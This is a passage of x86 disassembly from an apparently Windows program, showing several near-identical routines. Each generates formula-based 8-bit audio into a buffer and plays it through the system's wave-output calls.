  403d80:	a1 08 80 40 00       	mov    0x408008,%eax
  403d85:	33 c4                	xor    %esp,%eax
  403d87:	89 84 24 44 71 02 00 	mov    %eax,0x27144(%esp)
  403d8e:	53                   	push   %ebx
  403d8f:	56                   	push   %esi
  403d90:	33 c0                	xor    %eax,%eax
  403d92:	c7 44 24 34 01 00 01 	movl   $0x10001,0x34(%esp)
  403d99:	00 
  403d9a:	50                   	push   %eax
  403d9b:	50                   	push   %eax
  403d9c:	50                   	push   %eax
  403d9d:	66 89 44 24 50       	mov    %ax,0x50(%esp)
  403da2:	8d 44 24 40          	lea    0x40(%esp),%eax
  403da6:	50                   	push   %eax
  403da7:	6a ff                	push   $0xffffffff
  403da9:	8d 44 24 20          	lea    0x20(%esp),%eax
  403dad:	c7 44 24 4c 40 1f 00 	movl   $0x1f40,0x4c(%esp)
  403db4:	00 
  403db5:	50                   	push   %eax
  403db6:	c7 44 24 58 01 00 08 	movl   $0x80001,0x58(%esp)
  403dbd:	00 
  403dbe:	c7 44 24 54 40 1f 00 	movl   $0x1f40,0x54(%esp)
  403dc5:	00 
  403dc6:	ff 15 e0 60 40 00    	call   *0x4060e0
  403dcc:	33 c0                	xor    %eax,%eax
  403dce:	89 44 24 10          	mov    %eax,0x10(%esp)
  403dd2:	8b d8                	mov    %eax,%ebx
  403dd4:	ba 20 44 75 00       	mov    $0x754420,%edx
  403dd9:	c1 eb 0c             	shr    $0xc,%ebx
  403ddc:	8b cb                	mov    %ebx,%ecx
  403dde:	0f be c0             	movsbl %al,%eax
  403de1:	d3 fa                	sar    %cl,%edx
  403de3:	c1 fa 03             	sar    $0x3,%edx
  403de6:	80 e2 01             	and    $0x1,%dl
  403de9:	fe c2                	inc    %dl
  403deb:	0f be ca             	movsbl %dl,%ecx
  403dee:	0f af c8             	imul   %eax,%ecx
  403df1:	8b 44 24 10          	mov    0x10(%esp),%eax
  403df5:	c1 e8 04             	shr    $0x4,%eax
  403df8:	80 e1 de             	and    $0xde,%cl
  403dfb:	02 cb                	add    %bl,%cl
  403dfd:	0a c8                	or     %al,%cl
  403dff:	8b 44 24 10          	mov    0x10(%esp),%eax
  403e03:	88 4c 04 48          	mov    %cl,0x48(%esp,%eax,1)
  403e07:	40                   	inc    %eax
  403e08:	89 44 24 10          	mov    %eax,0x10(%esp)
  403e0c:	3d 00 71 02 00       	cmp    $0x27100,%eax
  403e11:	72 bf                	jb     0x403dd2
  403e13:	8d 44 24 48          	lea    0x48(%esp),%eax
  403e17:	c7 44 24 18 00 71 02 	movl   $0x27100,0x18(%esp)
  403e1e:	00 
  403e1f:	89 44 24 14          	mov    %eax,0x14(%esp)
  403e23:	8d 44 24 14          	lea    0x14(%esp),%eax
  403e27:	6a 20                	push   $0x20
  403e29:	50                   	push   %eax
  403e2a:	ff 74 24 14          	push   0x14(%esp)
  403e2e:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
  403e35:	00 
  403e36:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%esp)
  403e3d:	00 
  403e3e:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%esp)
  403e45:	00 
  403e46:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%esp)
  403e4d:	00 
  403e4e:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%esp)
  403e55:	00 
  403e56:	c7 44 24 3c 00 00 00 	movl   $0x0,0x3c(%esp)
  403e5d:	00 
  403e5e:	ff 15 ec 60 40 00    	call   *0x4060ec
  403e64:	6a 20                	push   $0x20
  403e66:	8d 44 24 18          	lea    0x18(%esp),%eax
  403e6a:	50                   	push   %eax
  403e6b:	ff 74 24 14          	push   0x14(%esp)
  403e6f:	ff 15 e4 60 40 00    	call   *0x4060e4
  403e75:	f6 44 24 24 01       	testb  $0x1,0x24(%esp)
  403e7a:	75 11                	jne    0x403e8d
  403e7c:	8b 35 64 60 40 00    	mov    0x406064,%esi
  403e82:	6a 64                	push   $0x64
  403e84:	ff d6                	call   *%esi
  403e86:	f6 44 24 24 01       	testb  $0x1,0x24(%esp)
  403e8b:	74 f5                	je     0x403e82
  403e8d:	6a 20                	push   $0x20
  403e8f:	8d 44 24 18          	lea    0x18(%esp),%eax
  403e93:	50                   	push   %eax
  403e94:	ff 74 24 14          	push   0x14(%esp)
  403e98:	ff 15 e8 60 40 00    	call   *0x4060e8
  403e9e:	ff 74 24 0c          	push   0xc(%esp)
  403ea2:	ff 15 f0 60 40 00    	call   *0x4060f0
  403ea8:	8b 8c 24 4c 71 02 00 	mov    0x2714c(%esp),%ecx
  403eaf:	33 c0                	xor    %eax,%eax
  403eb1:	5e                   	pop    %esi
  403eb2:	5b                   	pop    %ebx
  403eb3:	33 cc                	xor    %esp,%ecx
  403eb5:	e8 0a 10 00 00       	call   0x404ec4
  403eba:	8b e5                	mov    %ebp,%esp
  403ebc:	5d                   	pop    %ebp
  403ebd:	c2 04 00             	ret    $0x4
  403ec0:	55                   	push   %ebp
  403ec1:	8b ec                	mov    %esp,%ebp
  403ec3:	83 e4 f8             	and    $0xfffffff8,%esp
  403ec6:	b8 44 71 02 00       	mov    $0x27144,%eax
  403ecb:	e8 20 1e 00 00       	call   0x405cf0
  403ed0:	a1 08 80 40 00       	mov    0x408008,%eax
  403ed5:	33 c4                	xor    %esp,%eax
  403ed7:	89 84 24 40 71 02 00 	mov    %eax,0x27140(%esp)
  403ede:	56                   	push   %esi
  403edf:	33 c0                	xor    %eax,%eax
  403ee1:	c7 44 24 2c 01 00 01 	movl   $0x10001,0x2c(%esp)
  403ee8:	00 
  403ee9:	50                   	push   %eax
  403eea:	50                   	push   %eax
  403eeb:	50                   	push   %eax
  403eec:	66 89 44 24 48       	mov    %ax,0x48(%esp)
  403ef1:	8d 44 24 38          	lea    0x38(%esp),%eax
  403ef5:	50                   	push   %eax
  403ef6:	6a ff                	push   $0xffffffff
  403ef8:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  403efc:	c7 44 24 44 40 1f 00 	movl   $0x1f40,0x44(%esp)
  403f03:	00 
  403f04:	50                   	push   %eax
  403f05:	c7 44 24 50 01 00 08 	movl   $0x80001,0x50(%esp)
  403f0c:	00 
  403f0d:	c7 44 24 4c 40 1f 00 	movl   $0x1f40,0x4c(%esp)
  403f14:	00 
  403f15:	ff 15 e0 60 40 00    	call   *0x4060e0
  403f1b:	33 d2                	xor    %edx,%edx
  403f1d:	33 f6                	xor    %esi,%esi
  403f1f:	90                   	nop
  403f20:	8b ce                	mov    %esi,%ecx
  403f22:	8b c2                	mov    %edx,%eax
  403f24:	c1 e9 08             	shr    $0x8,%ecx
  403f27:	81 c6 1f 01 00 00    	add    $0x11f,%esi
  403f2d:	c1 e8 0b             	shr    $0xb,%eax
  403f30:	22 c8                	and    %al,%cl
  403f32:	0f be c2             	movsbl %dl,%eax
  403f35:	0f be c9             	movsbl %cl,%ecx
  403f38:	0f af c8             	imul   %eax,%ecx
  403f3b:	88 4c 14 40          	mov    %cl,0x40(%esp,%edx,1)
  403f3f:	42                   	inc    %edx
  403f40:	81 fe 00 af bc 02    	cmp    $0x2bcaf00,%esi
  403f46:	72 d8                	jb     0x403f20
  403f48:	8d 44 24 40          	lea    0x40(%esp),%eax
  403f4c:	c7 44 24 10 00 71 02 	movl   $0x27100,0x10(%esp)
  403f53:	00 
  403f54:	89 44 24 0c          	mov    %eax,0xc(%esp)
  403f58:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403f5c:	6a 20                	push   $0x20
  403f5e:	50                   	push   %eax
  403f5f:	ff 74 24 10          	push   0x10(%esp)
  403f63:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  403f6a:	00 
  403f6b:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
  403f72:	00 
  403f73:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
  403f7a:	00 
  403f7b:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%esp)
  403f82:	00 
  403f83:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%esp)
  403f8a:	00 
  403f8b:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%esp)
  403f92:	00 
  403f93:	ff 15 ec 60 40 00    	call   *0x4060ec
  403f99:	6a 20                	push   $0x20
  403f9b:	8d 44 24 10          	lea    0x10(%esp),%eax
  403f9f:	50                   	push   %eax
  403fa0:	ff 74 24 10          	push   0x10(%esp)
  403fa4:	ff 15 e4 60 40 00    	call   *0x4060e4
  403faa:	f6 44 24 1c 01       	testb  $0x1,0x1c(%esp)
  403faf:	75 11                	jne    0x403fc2
  403fb1:	8b 35 64 60 40 00    	mov    0x406064,%esi
  403fb7:	6a 64                	push   $0x64
  403fb9:	ff d6                	call   *%esi
  403fbb:	f6 44 24 1c 01       	testb  $0x1,0x1c(%esp)
  403fc0:	74 f5                	je     0x403fb7
  403fc2:	6a 20                	push   $0x20
  403fc4:	8d 44 24 10          	lea    0x10(%esp),%eax
  403fc8:	50                   	push   %eax
  403fc9:	ff 74 24 10          	push   0x10(%esp)
  403fcd:	ff 15 e8 60 40 00    	call   *0x4060e8
  403fd3:	ff 74 24 08          	push   0x8(%esp)
  403fd7:	ff 15 f0 60 40 00    	call   *0x4060f0
  403fdd:	8b 8c 24 44 71 02 00 	mov    0x27144(%esp),%ecx
  403fe4:	33 c0                	xor    %eax,%eax
  403fe6:	5e                   	pop    %esi
  403fe7:	33 cc                	xor    %esp,%ecx
  403fe9:	e8 d6 0e 00 00       	call   0x404ec4
  403fee:	8b e5                	mov    %ebp,%esp
  403ff0:	5d                   	pop    %ebp
  403ff1:	c2 04 00             	ret    $0x4
  403ff4:	cc                   	int3
  403ff5:	cc                   	int3
  403ff6:	cc                   	int3
  403ff7:	cc                   	int3
  403ff8:	cc                   	int3
  403ff9:	cc                   	int3
  403ffa:	cc                   	int3
  403ffb:	cc                   	int3
  403ffc:	cc                   	int3
  403ffd:	cc                   	int3
  403ffe:	cc                   	int3
  403fff:	cc                   	int3
  404000:	55                   	push   %ebp
  404001:	8b ec                	mov    %esp,%ebp
  404003:	83 e4 f8             	and    $0xfffffff8,%esp
  404006:	b8 44 c4 09 00       	mov    $0x9c444,%eax
  40400b:	e8 e0 1c 00 00       	call   0x405cf0
  404010:	a1 08 80 40 00       	mov    0x408008,%eax
  404015:	33 c4                	xor    %esp,%eax
  404017:	89 84 24 40 c4 09 00 	mov    %eax,0x9c440(%esp)
  40401e:	56                   	push   %esi
  40401f:	33 c0                	xor    %eax,%eax
  404021:	c7 44 24 2c 01 00 01 	movl   $0x10001,0x2c(%esp)
  404028:	00 
  404029:	50                   	push   %eax
  40402a:	50                   	push   %eax
  40402b:	50                   	push   %eax
  40402c:	66 89 44 24 48       	mov    %ax,0x48(%esp)
  404031:	8d 44 24 38          	lea    0x38(%esp),%eax
  404035:	50                   	push   %eax
  404036:	6a ff                	push   $0xffffffff
  404038:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  40403c:	c7 44 24 44 00 7d 00 	movl   $0x7d00,0x44(%esp)
  404043:	00 
  404044:	50                   	push   %eax
  404045:	c7 44 24 50 01 00 08 	movl   $0x80001,0x50(%esp)
  40404c:	00 
  40404d:	c7 44 24 4c 00 7d 00 	movl   $0x7d00,0x4c(%esp)
  404054:	00 
  404055:	ff 15 e0 60 40 00    	call   *0x4060e0
  40405b:	33 f6                	xor    %esi,%esi
  40405d:	0f 1f 00             	nopl   (%eax)
  404060:	8b ce                	mov    %esi,%ecx
  404062:	b8 11 08 04 02       	mov    $0x2040811,%eax
  404067:	c1 e9 0d             	shr    $0xd,%ecx
  40406a:	0f af ce             	imul   %esi,%ecx
  40406d:	f7 e1                	mul    %ecx
  40406f:	8b c6                	mov    %esi,%eax
  404071:	2b ca                	sub    %edx,%ecx
  404073:	c1 e8 04             	shr    $0x4,%eax
  404076:	d1 e9                	shr    $1,%ecx
  404078:	03 ca                	add    %edx,%ecx
  40407a:	8b d6                	mov    %esi,%edx
  40407c:	c1 e9 06             	shr    $0x6,%ecx
  40407f:	d3 ea                	shr    %cl,%edx
  404081:	0a d0                	or     %al,%dl
  404083:	88 54 34 40          	mov    %dl,0x40(%esp,%esi,1)
  404087:	46                   	inc    %esi
  404088:	81 fe 00 c4 09 00    	cmp    $0x9c400,%esi
  40408e:	72 d0                	jb     0x404060
  404090:	8d 44 24 40          	lea    0x40(%esp),%eax
  404094:	c7 44 24 10 00 c4 09 	movl   $0x9c400,0x10(%esp)
  40409b:	00 
  40409c:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4040a0:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4040a4:	6a 20                	push   $0x20
  4040a6:	50                   	push   %eax
  4040a7:	ff 74 24 10          	push   0x10(%esp)
  4040ab:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  4040b2:	00 
  4040b3:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
  4040ba:	00 
  4040bb:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
  4040c2:	00 
  4040c3:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%esp)
  4040ca:	00 
  4040cb:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%esp)
  4040d2:	00 
  4040d3:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%esp)
  4040da:	00 
  4040db:	ff 15 ec 60 40 00    	call   *0x4060ec
  4040e1:	6a 20                	push   $0x20
  4040e3:	8d 44 24 10          	lea    0x10(%esp),%eax
  4040e7:	50                   	push   %eax
  4040e8:	ff 74 24 10          	push   0x10(%esp)
  4040ec:	ff 15 e4 60 40 00    	call   *0x4060e4
  4040f2:	f6 44 24 1c 01       	testb  $0x1,0x1c(%esp)
  4040f7:	75 12                	jne    0x40410b
  4040f9:	8b 35 64 60 40 00    	mov    0x406064,%esi
  4040ff:	90                   	nop
  404100:	6a 64                	push   $0x64
  404102:	ff d6                	call   *%esi
  404104:	f6 44 24 1c 01       	testb  $0x1,0x1c(%esp)
  404109:	74 f5                	je     0x404100
  40410b:	6a 20                	push   $0x20
  40410d:	8d 44 24 10          	lea    0x10(%esp),%eax
  404111:	50                   	push   %eax
  404112:	ff 74 24 10          	push   0x10(%esp)
  404116:	ff 15 e8 60 40 00    	call   *0x4060e8
  40411c:	ff 74 24 08          	push   0x8(%esp)
  404120:	ff 15 f0 60 40 00    	call   *0x4060f0
  404126:	8b 8c 24 44 c4 09 00 	mov    0x9c444(%esp),%ecx
  40412d:	33 c0                	xor    %eax,%eax
  40412f:	5e                   	pop    %esi
  404130:	33 cc                	xor    %esp,%ecx
  404132:	e8 8d 0d 00 00       	call   0x404ec4
  404137:	8b e5                	mov    %ebp,%esp
  404139:	5d                   	pop    %ebp
  40413a:	c2 04 00             	ret    $0x4
  40413d:	cc                   	int3
  40413e:	cc                   	int3
  40413f:	cc                   	int3
  404140:	55                   	push   %ebp
  404141:	8b ec                	mov    %esp,%ebp
  404143:	83 e4 f8             	and    $0xfffffff8,%esp
  404146:	b8 44 a6 0e 00       	mov    $0xea644,%eax
  40414b:	e8 a0 1b 00 00       	call   0x405cf0
  404150:	a1 08 80 40 00       	mov    0x408008,%eax
  404155:	33 c4                	xor    %esp,%eax
  404157:	89 84 24 40 a6 0e 00 	mov    %eax,0xea640(%esp)
  40415e:	56                   	push   %esi
  40415f:	33 c0                	xor    %eax,%eax
  404161:	c7 44 24 2c 01 00 01 	movl   $0x10001,0x2c(%esp)
  404168:	00 
  404169:	50                   	push   %eax
  40416a:	50                   	push   %eax
  40416b:	50                   	push   %eax
  40416c:	66 89 44 24 48       	mov    %ax,0x48(%esp)
  404171:	8d 44 24 38          	lea    0x38(%esp),%eax
  404175:	50                   	push   %eax
  404176:	6a ff                	push   $0xffffffff
  404178:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  40417c:	c7 44 24 44 80 bb 00 	movl   $0xbb80,0x44(%esp)
  404183:	00 
  404184:	50                   	push   %eax
  404185:	c7 44 24 50 01 00 08 	movl   $0x80001,0x50(%esp)
  40418c:	00 
  40418d:	c7 44 24 4c 80 bb 00 	movl   $0xbb80,0x4c(%esp)
  404194:	00 
  404195:	ff 15 e0 60 40 00    	call   *0x4060e0
  40419b:	33 c0                	xor    %eax,%eax
  40419d:	0f 1f 00             	nopl   (%eax)
  4041a0:	8b c8                	mov    %eax,%ecx
  4041a2:	8b d0                	mov    %eax,%edx
  4041a4:	c1 e9 0e             	shr    $0xe,%ecx
  4041a7:	83 e1 0f             	and    $0xf,%ecx
  4041aa:	d3 ea                	shr    %cl,%edx
  4041ac:	32 d0                	xor    %al,%dl
  4041ae:	88 54 04 40          	mov    %dl,0x40(%esp,%eax,1)
  4041b2:	40                   	inc    %eax
  4041b3:	3d 00 a6 0e 00       	cmp    $0xea600,%eax
  4041b8:	72 e6                	jb     0x4041a0
  4041ba:	8d 44 24 40          	lea    0x40(%esp),%eax
  4041be:	c7 44 24 10 00 a6 0e 	movl   $0xea600,0x10(%esp)
  4041c5:	00 
  4041c6:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4041ca:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4041ce:	6a 20                	push   $0x20
  4041d0:	50                   	push   %eax
  4041d1:	ff 74 24 10          	push   0x10(%esp)
  4041d5:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  4041dc:	00 
  4041dd:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
  4041e4:	00 
  4041e5:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
  4041ec:	00 
  4041ed:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%esp)
  4041f4:	00 
  4041f5:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%esp)
  4041fc:	00 
  4041fd:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%esp)
  404204:	00 
  404205:	ff 15 ec 60 40 00    	call   *0x4060ec
  40420b:	6a 20                	push   $0x20
  40420d:	8d 44 24 10          	lea    0x10(%esp),%eax
  404211:	50                   	push   %eax
  404212:	ff 74 24 10          	push   0x10(%esp)
  404216:	ff 15 e4 60 40 00    	call   *0x4060e4
  40421c:	f6 44 24 1c 01       	testb  $0x1,0x1c(%esp)
  404221:	75 18                	jne    0x40423b
  404223:	8b 35 64 60 40 00    	mov    0x406064,%esi
  404229:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  404230:	6a 64                	push   $0x64
  404232:	ff d6                	call   *%esi
  404234:	f6 44 24 1c 01       	testb  $0x1,0x1c(%esp)
  404239:	74 f5                	je     0x404230
  40423b:	6a 20                	push   $0x20
  40423d:	8d 44 24 10          	lea    0x10(%esp),%eax
  404241:	50                   	push   %eax
  404242:	ff 74 24 10          	push   0x10(%esp)
  404246:	ff 15 e8 60 40 00    	call   *0x4060e8
  40424c:	ff 74 24 08          	push   0x8(%esp)
  404250:	ff 15 f0 60 40 00    	call   *0x4060f0
  404256:	8b 8c 24 44 a6 0e 00 	mov    0xea644(%esp),%ecx
  40425d:	33 c0                	xor    %eax,%eax
  40425f:	5e                   	pop    %esi
  404260:	33 cc                	xor    %esp,%ecx
  404262:	e8 5d 0c 00 00       	call   0x404ec4
  404267:	8b e5                	mov    %ebp,%esp
  404269:	5d                   	pop    %ebp
  40426a:	c2 04 00             	ret    $0x4
  40426d:	cc                   	int3
  40426e:	cc                   	int3
  40426f:	cc                   	int3
  404270:	55                   	push   %ebp
  404271:	8b ec                	mov    %esp,%ebp
  404273:	83 e4 f8             	and    $0xfffffff8,%esp
  404276:	b8 44 a6 0e 00       	mov    $0xea644,%eax
  40427b:	e8 70 1a 00 00       	call   0x405cf0
  404280:	a1 08 80 40 00       	mov    0x408008,%eax
  404285:	33 c4                	xor    %esp,%eax
  404287:	89 84 24 40 a6 0e 00 	mov    %eax,0xea640(%esp)
  40428e:	56                   	push   %esi
  40428f:	33 c0                	xor    %eax,%eax
  404291:	c7 44 24 2c 01 00 01 	movl   $0x10001,0x2c(%esp)
  404298:	00 
  404299:	50                   	push   %eax
  40429a:	50                   	push   %eax
  40429b:	50                   	push   %eax
  40429c:	66 89 44 24 48       	mov    %ax,0x48(%esp)
  4042a1:	8d 44 24 38          	lea    0x38(%esp),%eax
  4042a5:	50                   	push   %eax
  4042a6:	6a ff                	push   $0xffffffff
  4042a8:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4042ac:	c7 44 24 44 80 bb 00 	movl   $0xbb80,0x44(%esp)
  4042b3:	00 
  4042b4:	50                   	push   %eax
  4042b5:	c7 44 24 50 01 00 08 	movl   $0x80001,0x50(%esp)
  4042bc:	00 
  4042bd:	c7 44 24 4c 80 bb 00 	movl   $0xbb80,0x4c(%esp)
  4042c4:	00 
  4042c5:	ff 15 e0 60 40 00    	call   *0x4060e0
  4042cb:	33 f6                	xor    %esi,%esi
  4042cd:	0f 1f 00             	nopl   (%eax)
  4042d0:	f7 c6 00 40 00 00    	test   $0x4000,%esi
  4042d6:	74 07                	je     0x4042df
  4042d8:	b8 05 00 00 00       	mov    $0x5,%eax
  4042dd:	eb 0c                	jmp    0x4042eb
  4042df:	8b c6                	mov    %esi,%eax
  4042e1:	c1 e8 0f             	shr    $0xf,%eax
  4042e4:	f7 d0                	not    %eax
  4042e6:	83 e0 01             	and    $0x1,%eax
  4042e9:	0c 04                	or     $0x4,%al
  4042eb:	8b ce                	mov    %esi,%ecx
  4042ed:	0f be c0             	movsbl %al,%eax
  4042f0:	c1 e9 0f             	shr    $0xf,%ecx
  4042f3:	8b d6                	mov    %esi,%edx
  4042f5:	f7 d1                	not    %ecx
  4042f7:	83 e1 02             	and    $0x2,%ecx
  4042fa:	83 c9 05             	or     $0x5,%ecx
  4042fd:	d3 ea                	shr    %cl,%edx
  4042ff:	8b ce                	mov    %esi,%ecx
  404301:	d1 e9                	shr    $1,%ecx
  404303:	80 e2 7f             	and    $0x7f,%dl
  404306:	0f be c9             	movsbl %cl,%ecx
  404309:	0f af c8             	imul   %eax,%ecx
  40430c:	80 e1 7f             	and    $0x7f,%cl
  40430f:	02 d1                	add    %cl,%dl
  404311:	80 e2 80             	and    $0x80,%dl
  404314:	80 c2 40             	add    $0x40,%dl
  404317:	88 54 34 40          	mov    %dl,0x40(%esp,%esi,1)
  40431b:	46                   	inc    %esi
  40431c:	81 fe 00 a6 0e 00    	cmp    $0xea600,%esi
  404322:	72 ac                	jb     0x4042d0
  404324:	8d 44 24 40          	lea    0x40(%esp),%eax
  404328:	c7 44 24 10 00 a6 0e 	movl   $0xea600,0x10(%esp)
  40432f:	00 
  404330:	89 44 24 0c          	mov    %eax,0xc(%esp)
  404334:	8d 44 24 0c          	lea    0xc(%esp),%eax
  404338:	6a 20                	push   $0x20
  40433a:	50                   	push   %eax
  40433b:	ff 74 24 10          	push   0x10(%esp)
  40433f:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  404346:	00 
  404347:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
  40434e:	00 
  40434f:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
  404356:	00 
  404357:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%esp)
  40435e:	00 
  40435f:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%esp)
  404366:	00 
  404367:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%esp)
  40436e:	00 
  40436f:	ff 15 ec 60 40 00    	call   *0x4060ec
  404375:	6a 20                	push   $0x20
  404377:	8d 44 24 10          	lea    0x10(%esp),%eax
  40437b:	50                   	push   %eax
  40437c:	ff 74 24 10          	push   0x10(%esp)
  404380:	ff 15 e4 60 40 00    	call   *0x4060e4
  404386:	f6 44 24 1c 01       	testb  $0x1,0x1c(%esp)
  40438b:	75 11                	jne    0x40439e
  40438d:	8b 35 64 60 40 00    	mov    0x406064,%esi
  404393:	6a 64                	push   $0x64
  404395:	ff d6                	call   *%esi
  404397:	f6 44 24 1c 01       	testb  $0x1,0x1c(%esp)
  40439c:	74 f5                	je     0x404393
  40439e:	6a 20                	push   $0x20
  4043a0:	8d 44 24 10          	lea    0x10(%esp),%eax
  4043a4:	50                   	push   %eax
  4043a5:	ff 74 24 10          	push   0x10(%esp)
  4043a9:	ff 15 e8 60 40 00    	call   *0x4060e8
  4043af:	ff 74 24 08          	push   0x8(%esp)
  4043b3:	ff 15 f0 60 40 00    	call   *0x4060f0
  4043b9:	8b 8c 24 44 a6 0e 00 	mov    0xea644(%esp),%ecx
  4043c0:	33 c0                	xor    %eax,%eax
  4043c2:	5e                   	pop    %esi
  4043c3:	33 cc                	xor    %esp,%ecx
  4043c5:	e8 fa 0a 00 00       	call   0x404ec4
  4043ca:	8b e5                	mov    %ebp,%esp
  4043cc:	5d                   	pop    %ebp
  4043cd:	c2 04 00             	ret    $0x4
  4043d0:	55                   	push   %ebp
  4043d1:	8b ec                	mov    %esp,%ebp
  4043d3:	83 e4 f8             	and    $0xfffffff8,%esp
  4043d6:	b8 40 71 02 00       	mov    $0x27140,%eax
  4043db:	e8 10 19 00 00       	call   0x405cf0
  4043e0:	a1 08 80 40 00       	mov    0x408008,%eax
  4043e5:	33 c4                	xor    %esp,%eax
  4043e7:	89 84 24 3c 71 02 00 	mov    %eax,0x2713c(%esp)
  4043ee:	53                   	push   %ebx
  4043ef:	56                   	push   %esi
  4043f0:	33 c0                	xor    %eax,%eax
  4043f2:	c7 44 24 2c 01 00 01 	movl   $0x10001,0x2c(%esp)
  4043f9:	00 
  4043fa:	50                   	push   %eax
  4043fb:	50                   	push   %eax
  4043fc:	50                   	push   %eax
  4043fd:	66 89 44 24 48       	mov    %ax,0x48(%esp)
  404402:	8d 44 24 38          	lea    0x38(%esp),%eax
  404406:	50                   	push   %eax
  404407:	6a ff                	push   $0xffffffff
  404409:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  40440d:	c7 44 24 44 40 1f 00 	movl   $0x1f40,0x44(%esp)
  404414:	00 
  404415:	50                   	push   %eax
  404416:	c7 44 24 50 01 00 08 	movl   $0x80001,0x50(%esp)
  40441d:	00 
  40441e:	c7 44 24 4c 40 1f 00 	movl   $0x1f40,0x4c(%esp)
  404425:	00 
  404426:	ff 15 e0 60 40 00    	call   *0x4060e0
  40442c:	33 db                	xor    %ebx,%ebx
  40442e:	66 90                	xchg   %ax,%ax
  404430:	8b d3                	mov    %ebx,%edx
  404432:	8b cb                	mov    %ebx,%ecx
  404434:	c1 e9 08             	shr    $0x8,%ecx
  404437:	8b c3                	mov    %ebx,%eax
  404439:	c1 e8 0a             	shr    $0xa,%eax
  40443c:	24 28                	and    $0x28,%al
  40443e:	c1 ea 07             	shr    $0x7,%edx
  404441:	22 ca                	and    %dl,%cl
  404443:	80 e1 18             	and    $0x18,%cl
  404446:	0a c8                	or     %al,%cl
  404448:	0f be c3             	movsbl %bl,%eax
  40444b:	0f be c9             	movsbl %cl,%ecx
  40444e:	0f af c8             	imul   %eax,%ecx
  404451:	8b c3                	mov    %ebx,%eax
  404453:	c1 e8 04             	shr    $0x4,%eax
  404456:	0a c3                	or     %bl,%al
  404458:	24 2a                	and    $0x2a,%al
  40445a:	0a c8                	or     %al,%cl
  40445c:	8b c3                	mov    %ebx,%eax
  40445e:	c1 e8 02             	shr    $0x2,%eax
  404461:	22 c2                	and    %dl,%al
  404463:	0a c8                	or     %al,%cl
  404465:	8b c3                	mov    %ebx,%eax
  404467:	c1 e8 06             	shr    $0x6,%eax
  40446a:	24 04                	and    $0x4,%al
  40446c:	0a c8                	or     %al,%cl
  40446e:	88 4c 1c 40          	mov    %cl,0x40(%esp,%ebx,1)
  404472:	43                   	inc    %ebx
  404473:	81 fb 00 71 02 00    	cmp    $0x27100,%ebx
  404479:	72 b5                	jb     0x404430
  40447b:	8d 44 24 40          	lea    0x40(%esp),%eax
  40447f:	c7 44 24 10 00 71 02 	movl   $0x27100,0x10(%esp)
  404486:	00 
  404487:	89 44 24 0c          	mov    %eax,0xc(%esp)
  40448b:	8d 44 24 0c          	lea    0xc(%esp),%eax
  40448f:	6a 20                	push   $0x20
  404491:	50                   	push   %eax
  404492:	ff 74 24 10          	push   0x10(%esp)
  404496:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  40449d:	00 
  40449e:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
  4044a5:	00 
  4044a6:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
  4044ad:	00 
  4044ae:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%esp)
  4044b5:	00 
  4044b6:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%esp)
  4044bd:	00 
  4044be:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%esp)
  4044c5:	00 
  4044c6:	ff 15 ec 60 40 00    	call   *0x4060ec
  4044cc:	6a 20                	push   $0x20
  4044ce:	8d 44 24 10          	lea    0x10(%esp),%eax
  4044d2:	50                   	push   %eax
  4044d3:	ff 74 24 10          	push   0x10(%esp)
  4044d7:	ff 15 e4 60 40 00    	call   *0x4060e4
  4044dd:	f6 44 24 1c 01       	testb  $0x1,0x1c(%esp)
  4044e2:	75 17                	jne    0x4044fb
  4044e4:	8b 35 64 60 40 00    	mov    0x406064,%esi
  4044ea:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  4044f0:	6a 64                	push   $0x64
  4044f2:	ff d6                	call   *%esi
  4044f4:	f6 44 24 1c 01       	testb  $0x1,0x1c(%esp)
  4044f9:	74 f5                	je     0x4044f0
  4044fb:	6a 20                	push   $0x20
  4044fd:	8d 44 24 10          	lea    0x10(%esp),%eax
  404501:	50                   	push   %eax
  404502:	ff 74 24 10          	push   0x10(%esp)
